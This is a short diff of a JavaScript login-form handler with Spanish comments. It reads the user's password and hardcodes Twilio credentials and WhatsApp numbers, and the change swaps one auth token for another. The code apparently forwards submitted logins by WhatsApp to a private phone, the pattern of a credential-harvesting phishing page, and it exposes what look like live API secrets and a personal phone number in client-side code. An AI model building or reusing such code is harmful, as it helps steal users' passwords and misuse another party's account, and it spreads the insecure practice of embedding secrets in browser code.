@@ -5,7 +5,7 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
     const password = document.getElementById('password').value;
 
     const accountSid = 'AC8a4bfa0f29fa73b79d6fdeb7c6eda731'; // Reemplaza con tu Account SID de Twilio
-    const authToken = '86d9c9df7d3c92b7183347343cc6f7f0'; // Reemplaza con tu Auth Token de Twilio
+    const authToken = '050b58d503c19443441c106bfce2b255'; // Reemplaza con tu Auth Token de Twilio
     const fromWhatsAppNumber = 'whatsapp:+14155238886'; // Número de WhatsApp de Twilio
     const toWhatsAppNumber = 'whatsapp:+51940411928'; // Tu número de teléfono con formato internacional
 
